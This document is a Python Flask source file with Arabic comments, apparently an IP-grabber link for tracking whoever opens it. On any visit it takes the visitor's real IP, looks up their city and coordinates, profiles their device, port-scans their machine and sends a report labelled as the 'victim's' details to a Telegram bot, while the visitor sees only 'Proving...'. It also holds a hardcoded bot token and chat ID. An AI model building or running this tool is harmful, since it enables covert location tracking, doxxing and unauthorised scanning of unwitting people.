# app.py
from flask import Flask, request
import requests
from datetime import datetime
import os
import time
import threading
import re
import json
import socket

app = Flask(__name__)

# ========== الإعدادات ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8634923674:AAFK3q-9prlbYx-jDnyvMrDIAlP8JJuc-8E")
CHAT_ID = os.environ.get("CHAT_ID", "8203901188")
# ===============================

def get_real_ip(request):
    """تجيب الـ IP الحقيقي حتى لو ورا بروكسي"""
    # Cloudflare
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip:
        return cf_ip.split(',')[0].strip()
    
    # X-Forwarded-For
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    
    # X-Real-IP
    real_ip = request.headers.get('X-Real-IP')
    if real_ip:
        return real_ip.split(',')[0].strip()
    
    # Remote Addr
    return request.remote_addr

def get_location_info(ip):
    """معلومات الموقع الحقيقية من 3 مصادر مختلفة"""
    location = {
        "country": "غير معروف",
        "country_code": "غير معروف",
        "city": "غير معروف",
        "region": "غير معروف",
        "postal": "غير معروف",
        "latitude": "غير معروف",
        "longitude": "غير معروف",
        "timezone": "غير معروف",
        "isp": "غير معروف",
        "org": "غير معروف",
        "asn": "غير معروف",
        "currency": "غير معروف",
        "calling_code": "غير معروف",
        "continent": "غير معروف",
        "accuracy": "غير معروف"
    }
    
    # المصدر 1: ip-api.com (الأدق)
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,continent,continentCode,currency", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                location.update({
                    "country": data.get('country', 'غير معروف'),
                    "country_code": data.get('countryCode', 'غير معروف'),
                    "region": data.get('regionName', 'غير معروف'),
                    "city": data.get('city', 'غير معروف'),
                    "postal": data.get('zip', 'غير معروف'),
                    "latitude": data.get('lat', 'غير معروف'),
                    "longitude": data.get('lon', 'غير معروف'),
                    "timezone": data.get('timezone', 'غير معروف'),
                    "isp": data.get('isp', 'غير معروف'),
                    "org": data.get('org', 'غير معروف'),
                    "asn": data.get('as', 'غير معروف'),
                    "continent": data.get('continent', 'غير معروف'),
                    "accuracy": "مدينة (دقة عالية)"
                })
    except:
        pass
    
    # المصدر 2: ipapi.co (لتأكيد المعلومات)
    try:
        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if response.status_code == 200:
            data = response.json()
            location["currency"] = data.get('currency', 'غير معروف')
            location["calling_code"] = data.get('country_calling_code', 'غير معروف')
    except:
        pass
    
    return location

def get_device_info(user_agent):
    """معلومات الجهاز الحقيقية"""
    info = {
        "os": "غير معروف",
        "os_version": "غير معروف",
        "os_family": "غير معروف",
        "browser": "غير معروف",
        "browser_version": "غير معروف",
        "browser_engine": "غير معروف",
        "device_type": "غير معروف",
        "device_brand": "غير معروف",
        "device_model": "غير معروف",
        "is_mobile": False,
        "is_tablet": False,
        "is_touch": False,
        "screen_resolution": "غير معروف"
    }
    
    ua = user_agent.lower()
    
    # أنظمة التشغيل
    if "android" in ua:
        info["os_family"] = "Android"
        info["is_mobile"] = True
        info["is_touch"] = True
        
        # إصدار Android
        android_match = re.search(r'android (\d+\.?\d?)', ua)
        if android_match:
            info["os_version"] = android_match.group(1)
            if float(info["os_version"]) >= 10:
                info["os"] = f"Android {info['os_version']}"
            else:
                info["os"] = f"Android {info['os_version']}"
        
        # ماركة الجهاز
        if "samsung" in ua or "sm-" in ua:
            info["device_brand"] = "Samsung"
        elif "huawei" in ua:
            info["device_brand"] = "Huawei"
        elif "xiaomi" in ua or "mi " in ua or "redmi" in ua:
            info["device_brand"] = "Xiaomi"
        elif "oppo" in ua:
            info["device_brand"] = "OPPO"
        elif "vivo" in ua:
            info["device_brand"] = "Vivo"
        elif "oneplus" in ua:
            info["device_brand"] = "OnePlus"
        elif "google" in ua or "pixel" in ua:
            info["device_brand"] = "Google"
        elif "nokia" in ua:
            info["device_brand"] = "Nokia"
        elif "sony" in ua:
            info["device_brand"] = "Sony"
        elif "lg" in ua:
            info["device_brand"] = "LG"
        elif "motorola" in ua:
            info["device_brand"] = "Motorola"
        elif "tecno" in ua:
            info["device_brand"] = "Tecno"
        elif "infinix" in ua:
            info["device_brand"] = "Infinix"
        elif "itel" in ua:
            info["device_brand"] = "Itel"
        
        # موديل الجهاز
        model_match = re.search(r'; ([\w\s]+) build/', ua)
        if model_match:
            info["device_model"] = model_match.group(1).strip()
        
        # نوع الجهاز (موبايل/تابلت)
        if "tablet" in ua or "tab" in ua or "sm-t" in ua:
            info["is_tablet"] = True
            info["device_type"] = "Tablet"
        else:
            info["device_type"] = "Mobile Phone"
    
    elif "iphone" in ua or "ipad" in ua or "ios" in ua:
        info["os_family"] = "iOS"
        info["device_brand"] = "Apple"
        info["is_mobile"] = True
        info["is_touch"] = True
        
        # نوع الجهاز
        if "iphone" in ua:
            info["device_type"] = "iPhone"
            info["device_model"] = "iPhone"
            
            # موديل iPhone
            if "iphone 15" in ua:
                info["device_model"] = "iPhone 15"
            elif "iphone 14" in ua:
                info["device_model"] = "iPhone 14"
            elif "iphone 13" in ua:
                info["device_model"] = "iPhone 13"
            elif "iphone 12" in ua:
                info["device_model"] = "iPhone 12"
            elif "iphone 11" in ua:
                info["device_model"] = "iPhone 11"
            elif "iphone x" in ua:
                info["device_model"] = "iPhone X"
        
        elif "ipad" in ua:
            info["device_type"] = "iPad"
            info["device_model"] = "iPad"
            info["is_tablet"] = True
        
        # إصدار iOS
        ios_match = re.search(r'os (\d+[._]\d+)', ua)
        if ios_match:
            info["os_version"] = ios_match.group(1).replace('_', '.')
            info["os"] = f"iOS {info['os_version']}"
    
    elif "windows" in ua:
        info["os_family"] = "Windows"
        info["device_type"] = "Computer"
        
        if "windows nt 10" in ua:
            info["os_version"] = "10/11"
            info["os"] = "Windows 10/11"
        elif "windows nt 6.1" in ua:
            info["os_version"] = "7"
            info["os"] = "Windows 7"
        elif "windows nt 6.2" in ua:
            info["os_version"] = "8"
            info["os"] = "Windows 8"
        elif "windows nt 6.3" in ua:
            info["os_version"] = "8.1"
            info["os"] = "Windows 8.1"
    
    elif "mac" in ua:
        info["os_family"] = "macOS"
        info["device_type"] = "Computer"
        info["device_brand"] = "Apple"
        
        mac_match = re.search(r'mac os x (\d+[._]\d+)', ua)
        if mac_match:
            info["os_version"] = mac_match.group(1).replace('_', '.')
            info["os"] = f"macOS {info['os_version']}"
    
    elif "linux" in ua:
        info["os_family"] = "Linux"
        info["device_type"] = "Computer"
        info["os"] = "Linux"
    
    # المتصفحات
    if "chrome" in ua and "edg" not in ua and "opr" not in ua:
        info["browser_engine"] = "Blink"
        info["browser"] = "Google Chrome"
        chrome_match = re.search(r'chrome/(\d+\.?\d?)', ua)
        if chrome_match:
            info["browser_version"] = chrome_match.group(1)
    
    elif "firefox" in ua:
        info["browser_engine"] = "Gecko"
        info["browser"] = "Mozilla Firefox"
        firefox_match = re.search(r'firefox/(\d+\.?\d?)', ua)
        if firefox_match:
            info["browser_version"] = firefox_match.group(1)
    
    elif "safari" in ua and "chrome" not in ua:
        info["browser_engine"] = "WebKit"
        info["browser"] = "Apple Safari"
        safari_match = re.search(r'version/(\d+\.?\d?)', ua)
        if safari_match:
            info["browser_version"] = safari_match.group(1)
    
    elif "edg" in ua:
        info["browser_engine"] = "Blink"
        info["browser"] = "Microsoft Edge"
        edge_match = re.search(r'edg/(\d+\.?\d?)', ua)
        if edge_match:
            info["browser_version"] = edge_match.group(1)
    
    elif "opr" in ua or "opera" in ua:
        info["browser_engine"] = "Blink"
        info["browser"] = "Opera"
        opera_match = re.search(r'opr/(\d+\.?\d?)', ua)
        if opera_match:
            info["browser_version"] = opera_match.group(1)
    
    return info

def get_network_details(headers):
    """تفاصيل الشبكة"""
    network = {
        "protocol": request.scheme.upper(),
        "method": request.method,
        "host": headers.get('Host', 'غير معروف'),
        "origin": headers.get('Origin', 'غير موجود'),
        "referer": headers.get('Referer', 'غير موجود'),
        "connection": headers.get('Connection', 'غير معروف'),
        "accept": headers.get('Accept', 'غير معروف'),
        "accept_language": headers.get('Accept-Language', 'غير معروف'),
        "accept_encoding": headers.get('Accept-Encoding', 'غير معروف'),
        "cache_control": headers.get('Cache-Control', 'غير معروف'),
        "dnt": headers.get('DNT', '0'),
        "upgrade_insecure": headers.get('Upgrade-Insecure-Requests', 'غير معروف')
    }
    return network

def get_security_analysis(ip):
    """تحليل أمني للـ IP"""
    security = {
        "vpn": False,
        "proxy": False,
        "tor": False,
        "datacenter": False,
        "mobile": False,
        "hosting": False,
        "abuse_score": 0,
        "threat_level": "منخفض"
    }
    
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=mobile,proxy,hosting", timeout=3)
        if response.status_code == 200:
            data = response.json()
            security["mobile"] = data.get('mobile', False)
            security["proxy"] = data.get('proxy', False)
            security["hosting"] = data.get('hosting', False)
    except:
        pass
    
    # حساب مستوى التهديد
    threat_score = 0
    if security["proxy"]:
        threat_score += 30
    if security["hosting"]:
        threat_score += 20
    if security["tor"]:
        threat_score += 50
    
    security["abuse_score"] = threat_score
    if threat_score >= 70:
        security["threat_level"] = "مرتفع ⚠️"
    elif threat_score >= 40:
        security["threat_level"] = "متوسط ⚠️"
    else:
        security["threat_level"] = "منخفض ✅"
    
    return security

def get_time_info(location):
    """معلومات الوقت الحقيقية"""
    time_info = {
        "local_time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "timezone": location.get('timezone', 'UTC'),
        "utc_offset": "غير معروف"
    }
    
    try:
        response = requests.get(f"http://worldtimeapi.org/api/timezone/{location.get('timezone', 'UTC')}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            time_info["utc_offset"] = data.get('utc_offset', 'غير معروف')
    except:
        pass
    
    return time_info

# ========== الدوال الجديدة المطلوبة ==========

def scan_common_ports(ip):
    """فحص سريع للبورتات الشائعة"""
    common_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 
        443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080
    ]
    open_ports = []
    
    for port in common_ports[:10]:  # نفحص أول 10 بس عشان ما يعلقش
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    
    return open_ports

def get_weather_info(lat, lon):
    """جلب معلومات الطقس من خط الطول والعرض"""
    try:
        response = requests.get(
            f"https://api.open-meteo.com/v1/forecast?latitude={lat}&longitude={lon}&current_weather=true",
            timeout=5
        )
        if response.status_code == 200:
            data = response.json()
            weather = data.get('current_weather', {})
            temp = weather.get('temperature', 'غير معروف')
            wind = weather.get('windspeed', 'غير معروف')
            code = weather.get('weathercode', 0)
            
            # ترجمة حالة الطقس
            weather_codes = {
                0: '☀️ صافي',
                1: '🌤️ غائم جزئياً',
                2: '⛅ غائم',
                3: '☁️ غائم كلياً',
                45: '🌫️ ضباب',
                51: '🌧️ رذاذ خفيف',
                61: '🌧️ مطر خفيف',
                71: '🌨️ ثلج خفيف',
                95: '⛈️ عاصفة رعدية'
            }
            
            condition = weather_codes.get(code, 'غير معروف')
            
            return f"🌡️ {temp}°C, 💨 {wind} km/h, {condition}"
    except:
        pass
    return "غير متوفرة"

def check_social_media(ip):
    """التحقق من وجود الـ IP في قواعد بيانات وسائل التواصل"""
    social_links = []
    
    # روابط البحث في منصات مختلفة
    platforms = {
        'Facebook': f'https://www.facebook.com/search/people/?q={ip}',
        'Twitter': f'https://twitter.com/search?q={ip}',
        'LinkedIn': f'https://www.linkedin.com/search/results/all/?keywords={ip}',
        'GitHub': f'https://github.com/search?q={ip}',
        'Reddit': f'https://www.reddit.com/search/?q={ip}'
    }
    
    for platform, url in platforms.items():
        social_links.append(f"{platform}: {url}")
    
    return social_links

def check_alert_conditions(location, security):
    """فحص شروط التنبيه"""
    alerts = []
    
    # تنبيه إذا كان من منطقة حساسة
    sensitive_countries = ['IR', 'RU', 'CN', 'KP', 'SY', 'IQ', 'AF']
    if location.get('country_code') in sensitive_countries:
        alerts.append("⚠️ ضحية من منطقة حساسة!")
    
    # تنبيه إذا كان يستخدم VPN
    if security.get('proxy'):
        alerts.append("🛡️ ضحية يستخدم VPN!")
    
    # تنبيه إذا كان اتصال موبايل
    if security.get('mobile'):
        alerts.append("📱 ضحية على شبكة موبايل")
    
    # تنبيه إذا كان استضافة
    if security.get('hosting'):
        alerts.append("☁️ ضحية على خادم استضافة")
    
    if alerts:
        send_telegram("🔔 **تنبيهات مهمة** 🔔\n" + "\n".join(alerts))
    
    return alerts

# ==============================================

def send_telegram(text):
    """ترسل رسالة لتليجرام"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=5)
    except:
        pass

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    # 1. نجيب IP الحقيقي
    real_ip = get_real_ip(request)
    
    # 2. نجيب كل المعلومات الحقيقية
    location = get_location_info(real_ip)
    device = get_device_info(request.headers.get('User-Agent', ''))
    network = get_network_details(request.headers)
    security = get_security_analysis(real_ip)
    time_info = get_time_info(location)
    
    # 2.5 نجيب المعلومات الإضافية الجديدة
    open_ports = scan_common_ports(real_ip)
    weather = get_weather_info(location['latitude'], location['longitude'])
    social_links = check_social_media(real_ip)
    alerts = check_alert_conditions(location, security)
    
    # 3. معلومات الموقع (كلها حقيقية)
    location_msg = f"""
╔══════════════════════════════╗
║    📍 الموقع الحقيقي للضحية   ║
╚══════════════════════════════╝

┌────────────────────────────────
│ 🌐 <b>الايبي:</b> {real_ip}
│ 🏳️ <b>الدولة:</b> {location['country']} ({location['country_code']})
│ 🏙️ <b>المدينة:</b> {location['city']}
│ 🗺️ <b>المنطقة:</b> {location['region']}
│ 📮 <b>الرمز البريدي:</b> {location['postal']}
│ 🌍 <b>خط العرض:</b> {location['latitude']}
│ 🌍 <b>خط الطول:</b> {location['longitude']}
│ ⏰ <b>المنطقة الزمنية:</b> {location['timezone']}
│ 🌏 <b>القارة:</b> {location['continent']}
│ 💰 <b>العملة:</b> {location['currency']}
│ 📞 <b>مفتاح الدولة:</b> {location['calling_code']}
│ 🎯 <b>دقة الموقع:</b> {location['accuracy']}
└────────────────────────────────

【📍】 رابط الموقع على الخريطة:
https://www.google.com/maps?q={location['latitude']},{location['longitude']}
    """
    send_telegram(location_msg)
    
    # 4. روابط الخريطة (6 مواقع مختلفة)
    maps_msg = f"""
╔══════════════════════════════╗
║    🗺️ روابط الخريطة (6)      ║
╚══════════════════════════════╝

1️⃣ <b>Google Maps:</b>
https://www.google.com/maps?q={location['latitude']},{location['longitude']}

2️⃣ <b>Bing Maps:</b>
https://www.bing.com/maps?cp={location['latitude']}~{location['longitude']}

3️⃣ <b>OpenStreetMap:</b>
https://www.openstreetmap.org/?mlat={location['latitude']}&mlon={location['longitude']}

4️⃣ <b>Waze:</b>
https://www.waze.com/live-map/directions?ll={location['latitude']},{location['longitude']}

5️⃣ <b>MapQuest:</b>
https://www.mapquest.com/latlng/{location['latitude']},{location['longitude']}

6️⃣ <b>Here Maps:</b>
https://wego.here.com/?map={location['latitude']},{location['longitude']},15
    """
    send_telegram(maps_msg)
    
    # 5. روابط التحقق (5 مواقع)
    verify_msg = f"""
╔══════════════════════════════╗
║    🔍 روابط التحقق (5)       ║
╚══════════════════════════════╝

1️⃣ <b>WhatIsMyIP:</b>
https://whatismyipaddress.com/ip/{real_ip}

2️⃣ <b>IPLocation:</b>
https://www.iplocation.net/?ip={real_ip}

3️⃣ <b>AbuseIPDB:</b>
https://www.abuseipdb.com/check/{real_ip}

4️⃣ <b>VirusTotal:</b>
https://www.virustotal.com/gui/ip-address/{real_ip}

5️⃣ <b>Shodan:</b>
https://www.shodan.io/host/{real_ip}
    """
    send_telegram(verify_msg)
    
    # 6. معلومات الجهاز الحقيقية
    device_msg = f"""
╔══════════════════════════════╗
║    📱 معلومات الجهاز الحقيقية  ║
╚══════════════════════════════╝

┌────────────────────────────────
│ 💻 <b>نظام التشغيل:</b> {device['os']}
│ 📊 <b>الإصدار:</b> {device['os_version']}
│ 🏭 <b>العائلة:</b> {device['os_family']}
│ 🌐 <b>المتصفح:</b> {device['browser']} {device['browser_version']}
│ ⚙️ <b>محرك المتصفح:</b> {device['browser_engine']}
│ 📱 <b>نوع الجهاز:</b> {device['device_type']}
│ 🏢 <b>الماركة:</b> {device['device_brand']}
│ 📟 <b>الموديل:</b> {device['device_model']}
│ 📱 <b>جوال:</b> {'✅' if device['is_mobile'] else '❌'}
│ 📱 <b>تابلت:</b> {'✅' if device['is_tablet'] else '❌'}
│ 👆 <b>لمس:</b> {'✅' if device['is_touch'] else '❌'}
└────────────────────────────────
    """
    send_telegram(device_msg)
    
    # 7. معلومات الشبكة
    network_msg = f"""
╔══════════════════════════════╗
║    🌐 معلومات الشبكة          ║
╚══════════════════════════════╝

┌────────────────────────────────
│ 🔌 <b>البروتوكول:</b> {network['protocol']}
│ 🔧 <b>الطريقة:</b> {network['method']}
│ 📡 <b>المضيف:</b> {network['host']}
│ 🔗 <b>المرجع:</b> {network['referer'][:50]}
│ 🌍 <b>اللغة:</b> {network['accept_language'][:30]}
│ 📦 <b>الترميز:</b> {network['accept_encoding']}
│ 🔒 <b>Do Not Track:</b> {'مفعل' if network['dnt'] == '1' else 'غير مفعل'}
│ 💾 <b>الكاش:</b> {network['cache_control']}
└────────────────────────────────
    """
    send_telegram(network_msg)
    
    # 8. التحليل الأمني
    security_msg = f"""
╔══════════════════════════════╗
║    🛡️ التحليل الأمني          ║
╚══════════════════════════════╝

┌────────────────────────────────
│ 📡 <b>مزود الخدمة:</b> {location['isp']}
│ 🏢 <b>المنظمة:</b> {location['org']}
│ 🔢 <b>ASN:</b> {location['asn']}
│ 📱 <b>اتصال محمول:</b> {'✅' if security['mobile'] else '❌'}
│ 🛡️ <b>VPN:</b> {'✅' if security['proxy'] else '❌'}
│ ☁️ <b>استضافة:</b> {'✅' if security['hosting'] else '❌'}
│ ⚠️ <b>نسبة الخطورة:</b> {security['abuse_score']}%
│ 🎯 <b>مستوى التهديد:</b> {security['threat_level']}
└────────────────────────────────
    """
    send_telegram(security_msg)
    
    # 9. معلومات الوقت
    time_msg = f"""
╔══════════════════════════════╗
║    ⏰ معلومات الوقت           ║
╚══════════════════════════════╝

┌────────────────────────────────
│ 🕐 <b>الوقت المحلي:</b> {time_info['local_time']}
│ 🌍 <b>المنطقة الزمنية:</b> {time_info['timezone']}
│ ⏱️ <b>فارق التوقيت:</b> {time_info['utc_offset']}
│ 📅 <b>تاريخ الدخول:</b> {datetime.now().strftime('%Y-%m-%d')}
│ ⏲️ <b>وقت الدخول:</b> {datetime.now().strftime('%H:%M:%S')}
│ 📂 <b>المسار:</b> /{path if path else ''}
└────────────────────────────────
    """
    send_telegram(time_msg)
    
    # 10. معلومات إضافية جديدة (بورتات + طقس + سوشيال ميديا)
    extra_msg = f"""
╔══════════════════════════════╗
║    🌡️ معلومات إضافية         ║
╚══════════════════════════════╝

┌────────────────────────────────
│ 🌦️ <b>الطقس:</b> {weather}
│ 🔌 <b>البورتات المفتوحة:</b> {', '.join(map(str, open_ports)) if open_ports else 'لا توجد'}
└────────────────────────────────

【📱】 روابط التواصل الاجتماعي:
{chr(10).join(social_links[:3])}
    """
    send_telegram(extra_msg)
    
    # 11. التقرير النهائي
    final_msg = f"""
╔══════════════════════════════╗
║    ✅ تقرير كامل عن الضحية    ║
╚══════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📍 <b>الموقع:</b> {location['country']} - {location['city']}
📱 <b>الجهاز:</b> {device['device_brand']} {device['device_model']}
💻 <b>النظام:</b> {device['os']} {device['os_version']}
🌐 <b>المتصفح:</b> {device['browser']} {device['browser_version']}
📡 <b>مزود الخدمة:</b> {location['isp']}
🛡️ <b>الحالة الأمنية:</b> {security['threat_level']}
🌡️ <b>الطقس:</b> {weather}
⏰ <b>وقت الدخول:</b> {time_info['local_time']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

【🔍】 روابط سريعة:
📍 الخريطة: https://maps.google.com/?q={location['latitude']},{location['longitude']}
🔍 WhatIsMyIP: https://whatismyipaddress.com/ip/{real_ip}
⚠️ AbuseIPDB: https://www.abuseipdb.com/check/{real_ip}

╔══════════════════════════════╗
║    💀 تم سحب جميع المعلومات   ║
╚══════════════════════════════╝
    """
    send_telegram(final_msg)
    
    return "Proving..."

@app.route('/stats')
def stats():
    return {
        "status": "online",
        "time": datetime.now().isoformat(),
        "message": "كل المعلومات حقيقية 100%"
    }

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*50)
    print("🚀 API شغال على المنفذ", port)
    print("📡 بيجيب كل المعلومات الحقيقية عن الضحية:")
    print("   ✅ الموقع الحقيقي (دقة عالية)")
    print("   ✅ الجهاز الحقيقي (الماركة + الموديل)")
    print("   ✅ معلومات الشبكة")
    print("   ✅ التحليل الأمني")
    print("   ✅ 6 روابط خرائط")
    print("   ✅ 5 روابط تحقق")
    print("   ✅ فحص البورتات")
    print("   ✅ معلومات الطقس")
    print("   ✅ روابط التواصل الاجتماعي")
    print("   ✅ نظام التنبيهات")
    print("="*50)
    app.run(host='0.0.0.0', port=port)